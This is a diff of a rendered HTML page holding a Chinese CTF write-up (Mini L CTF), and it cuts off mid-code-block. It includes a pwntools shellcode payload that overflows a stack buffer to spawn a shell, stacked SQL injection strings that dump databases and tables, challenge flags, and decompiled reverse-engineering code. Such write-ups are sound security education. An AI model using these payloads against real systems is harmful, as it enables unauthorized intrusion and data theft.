@@ -52,13 +52,26 @@
 <li><strong>在<code>rsp</code>所指向的位置覆盖上<code>shellcode</code>, 改变<code>rsp</code>的值使其指向<code>getshell</code>的<code>shellcode</code>并再次进行跳转, 完成<code>getshell</code></strong></li>
 </ul>
 <p>那么<code>payload</code>就很容易构造出来了:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="n">sc1</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
 </span></span><span class="line"><span class="cl"><span class="n">sc2</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;sub rsp,64&#39;</span><span class="p">)</span><span class="o">//</span><span class="mi">48</span><span class="n">字节的字符串</span><span class="o">+</span><span class="mi">8</span><span class="n">字节的rsp</span><span class="o">+</span><span class="mi">8</span><span class="n">字节的rbp</span><span class="p">,</span> <span class="n">跳回开头</span>
 </span></span><span class="line"><span class="cl"><span class="n">sc3</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;jmp rsp&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">sc1</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">56</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">sc1</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;bd&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">sc2</span> <span class="o">+</span> <span class="n">sc3</span></span></span></code></pre></div><p><img loading="lazy" src='https://i.loli.net/2020/05/11/DCm7Wv6HMOnVLja.png' alt="image.png"></p>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">sc1</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">56</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">sc1</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;bd&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">sc2</span> <span class="o">+</span> <span class="n">sc3</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src='https://i.loli.net/2020/05/11/DCm7Wv6HMOnVLja.png' alt="image.png"></p>
 <h2 class="heading-element" id="mini-l-ctf-writeup-by-luoqin"><span>Mini L CTF Writeup by luoqi@n</span>
  <a href="#mini-l-ctf-writeup-by-luoqin" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
@@ -81,13 +94,41 @@
 <p>这里拿小sad举例:</p>
 <p><img loading="lazy" src='https://i.loli.net/2020/05/16/EtImALgT82Oeznq.png' alt="image-20200516105810838.png"></p>
 <p>看见这个, 我立刻想到了强网杯的随便注 (其实找了半天) , 因为那道题用到了堆叠注入的知识点, 所以我就试了一下</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">sad&#39;); show databases;</span></span></code></pre></div><p><img loading="lazy" src='https://i.loli.net/2020/05/16/YUsGpLbv8QtgiNR.png' alt="image-20200516110446026.png"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">sad&#39;); show databases;</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src='https://i.loli.net/2020/05/16/YUsGpLbv8QtgiNR.png' alt="image-20200516110446026.png"></p>
 <p>成了, 再试一下查询表</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">sad&#39;); show tables;</span></span></code></pre></div><p><img loading="lazy" src='https://i.loli.net/2020/05/16/N7hIaBu3ymOJ5E8.png' alt="image-20200516110244132.png"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">sad&#39;); show tables;</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src='https://i.loli.net/2020/05/16/N7hIaBu3ymOJ5E8.png' alt="image-20200516110244132.png"></p>
 <p>这个看起来这么臭的表一定有问题 (确信</p>
 <p>这里我用到了handler, 这条语句使我们能够一行一行的浏览一个表中的数据, 所以:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">sad&#39;);handler`1145141919810`open;handler`1145141919810`read first;</span></span></code></pre></div><p>好的给了个假flag&hellip;再读取下一条</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">sad&#39;);handler`1145141919810`open;handler`1145141919810`read first;handler`1145141919810`read next;</span></span></code></pre></div><p>直接给出flag (因为是动态flag所以不贴了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">sad&#39;);handler`1145141919810`open;handler`1145141919810`read first;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>好的给了个假flag&hellip;再读取下一条</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">sad&#39;);handler`1145141919810`open;handler`1145141919810`read first;handler`1145141919810`read next;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接给出flag (因为是动态flag所以不贴了</p>
 <h2 class="heading-element" id="reverse"><span>reverse</span>
  <a href="#reverse" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
@@ -106,7 +147,14 @@
 <p><img loading="lazy" src='https://i.loli.net/2020/05/16/7ONTUZcbegP4YaQ.png' alt="image-20200516145508231.png"></p>
 <p>登录成功后, 在收件箱发现一个压缩包: thing.zip, 打开之后在其中的QQ.e文件里发现flag</p>
 <p><img loading="lazy" src='https://i.loli.net/2020/05/16/Q6DX4Pj2zlTh7qc.png' alt="image-20200516145719636.png"></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">miniL{Epl_Oh_gre@T}</span></span></code></pre></div><h2 class="heading-element" id="misc"><span>Misc</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">miniL{Epl_Oh_gre@T}</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 class="heading-element" id="misc"><span>Misc</span>
  <a href="#misc" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
@@ -118,7 +166,14 @@
 <p><img loading="lazy" src='https://i.loli.net/2020/05/16/EqNiWxgfOcYpFTu.png' alt="image-20200516152750684.png"></p>
 <p>在data.unity3d文件里人 肉 搜 索到的flag (因为flag的minil少了一个m, 搜索minil是搜不到的</p>
 <p><img loading="lazy" src='https://i.loli.net/2020/05/16/hO81TYAlNsPQEjW.png' alt="image-20200516153027924.png"></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">minil{diosamasayikou}</span></span></code></pre></div><p>后来听别人说游戏通关也有flag, 一共15关, 我打到14关就过不去了只能放弃 (</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">minil{diosamasayikou}</span></span></code></pre></td></tr></table>
+</div>
+</div><p>后来听别人说游戏通关也有flag, 一共15关, 我打到14关就过不去了只能放弃 (</p>
 <h4 class="heading-element" id="easyvmem"><span>EasyVmem</span>
  <a href="#easyvmem" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
@@ -131,7 +186,14 @@
 <p>假flag里 (base64) 的大致内容是grep cha113nge to start the game, 至于下面那一堆s3cR3t (太多了就不放这了) 后面的数字一直在变, 从10 10一直到289 289, 猜测是289x289像素的图片, 于是让RX大哥画了个图:</p>
 <img src="https://i.loli.net/2020/05/16/xrSw36YFG9ovIMb.png" alt="image-20200516154328639.png" style="zoom:67%;" />
 <p>扫一下就可以获得flag (出题人说他是在volatility环境下设置的题, 所以我这算是抄近路了</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">miniLCTF{mAst3R_0F_v0Lat1l1tY!}</span></span></code></pre></div><h4 class="heading-element" id="mitm_0"><span>MITM_0</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">miniLCTF{mAst3R_0F_v0Lat1l1tY!}</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 class="heading-element" id="mitm_0"><span>MITM_0</span>
  <a href="#mitm_0" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
@@ -169,7 +231,68 @@
  </a>
 </h3><p>本题就是一个很常规的逆向, 不过F5之后不太好康而已.</p>
 <p>F5出来的源码:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl"> <span class="kr">__m128i</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// xmm1
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="kr">__m128i</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// xmm0
@@ -225,9 +348,82 @@
 </span></span><span class="line"><span class="cl"> <span class="p">}</span>
 </span></span><span class="line"><span class="cl"> <span class="k">while</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">&lt;</span> <span class="mi">20</span> <span class="p">);</span>
 </span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v17</span><span class="p">[</span><span class="mi">14</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>程序将输入和<code>v10</code>处的数据<code>+100</code>后进行比对.</p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>程序将输入和<code>v10</code>处的数据<code>+100</code>后进行比对.</p>
 <p>相关数据:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">xmmword_1400033E0</span> <span class="n">xmmword</span> <span class="mf">10000000E000000150000000</span><span class="n">Fh</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">xmmword_1400033E0</span> <span class="n">xmmword</span> <span class="mf">10000000E000000150000000</span><span class="n">Fh</span>
 </span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">rdata</span><span class="p">:</span><span class="mf">00000001400033E0</span> <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="n">main</span><span class="o">+</span><span class="mi">39</span><span class="err">↑</span><span class="n">r</span>
 </span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">rdata</span><span class="p">:</span><span class="mf">00000001400033F</span><span class="mi">0</span> <span class="n">xmmword_1400033F0</span> <span class="n">xmmword</span> <span class="mf">1FF</span><span class="n">FFFFFB0000000FFFFFFFC3h</span>
 </span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">rdata</span><span class="p">:</span><span class="mf">00000001400033F</span><span class="mi">0</span> <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="n">main</span><span class="o">+</span><span class="mi">55</span><span class="err">↑</span><span class="n">r</span>
@@ -293,8 +489,23 @@
 </span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">rdata</span><span class="p">:</span><span class="mo">000000014000344</span><span class="n">C</span> <span class="n">db</span> <span class="mf">0F</span><span class="n">Dh</span>
 </span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">rdata</span><span class="p">:</span><span class="mo">000000014000344</span><span class="n">D</span> <span class="n">db</span> <span class="mf">0FF</span><span class="n">h</span>
 </span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">rdata</span><span class="p">:</span><span class="mo">000000014000344</span><span class="n">E</span> <span class="n">db</span> <span class="mf">0FF</span><span class="n">h</span>
-</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">rdata</span><span class="p">:</span><span class="mf">000000014000344F</span> <span class="n">db</span> <span class="mf">0FF</span><span class="n">h</span></span></span></code></pre></div><p>简单的把数据都复制出来, 输出一下:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">rdata</span><span class="p">:</span><span class="mf">000000014000344F</span> <span class="n">db</span> <span class="mf">0FF</span><span class="n">h</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>简单的把数据都复制出来, 输出一下:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">test</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">9</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mh">0xA</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0xF</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span><span class="mh">0xf</span><span class="p">,</span><span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">};</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
@@ -303,7 +514,9 @@
 </span></span><span class="line"><span class="cl"> <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="c1">// minil{easyre&#39;s_easy}
-</span></span></span></code></pre></div><p>这个程序的输出顺序有些乱, 自己拼接一下就好了.</p>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个程序的输出顺序有些乱, 自己拼接一下就好了.</p>
 <h3 class="heading-element" id="machine"><span>machine</span>
  <a href="#machine" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
@@ -317,7 +530,78 @@
  </a>
 </h3><p>这道题表面上看着是虚拟化, 实际上没发现和虚拟化有什么关系emmmm&hellip;</p>
 <p>F5之后分析的<code>main</code>函数:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span></code></pre></td>
+<td class="lntd">
